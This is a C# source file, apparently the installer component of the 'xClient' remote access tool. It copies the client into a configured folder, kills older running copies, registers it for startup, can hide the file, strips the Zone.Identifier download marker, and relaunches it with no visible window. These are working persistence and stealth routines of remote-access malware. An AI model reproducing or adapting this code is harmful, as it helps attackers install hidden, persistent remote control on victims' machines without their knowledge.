using System;
using System.Diagnostics;
using System.IO;
using System.Threading;
using xClient.Config;
using xClient.Core.Data;
using xClient.Core.Helper;
using xClient.Core.Networking;

namespace xClient.Core.Installation
{
    public static class ClientInstaller
    {
        public static void Install(Client client)
        {
            bool isKilled = false;

            // create target dir
            if (!Directory.Exists(Path.Combine(Settings.DIRECTORY, Settings.SUBDIRECTORY)))
            {
                try
                {
                    Directory.CreateDirectory(Path.Combine(Settings.DIRECTORY, Settings.SUBDIRECTORY));
                }
                catch (Exception)
                {
                    return;
                }
            }

            // delete existing file
            if (File.Exists(ClientData.InstallPath))
            {
                try
                {
                    File.Delete(ClientData.InstallPath);
                }
                catch (Exception ex)
                {
                    if (ex is IOException || ex is UnauthorizedAccessException)
                    {
                        // kill old process if new mutex
                        Process[] foundProcesses =
                            Process.GetProcessesByName(Path.GetFileNameWithoutExtension(ClientData.InstallPath));
                        int myPid = Process.GetCurrentProcess().Id;
                        foreach (var prc in foundProcesses)
                        {
                            if (prc.Id == myPid) continue;
                            prc.Kill();
                            isKilled = true;
                        }
                    }
                }
            }

            if (isKilled) Thread.Sleep(5000);

            //copy client to target dir
            try
            {
                File.Copy(ClientData.CurrentPath, ClientData.InstallPath, true);
            }
            catch (Exception)
            {
                return;
            }

            if (Settings.STARTUP)
            {
                if (!Startup.AddToStartup())
                    ClientData.AddToStartupFailed = true;
            }

            if (Settings.HIDEFILE)
            {
                try
                {
                    File.SetAttributes(ClientData.InstallPath, FileAttributes.Hidden);
                }
                catch (Exception)
                {
                }
            }

            FileHelper.DeleteZoneIdentifier(ClientData.InstallPath);

            //start file
            var startInfo = new ProcessStartInfo
            {
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true,
                UseShellExecute = false,
                FileName = ClientData.InstallPath
            };
            try
            {
                Process.Start(startInfo);
            }
            catch (Exception)
            {
            }
        }
    }
}
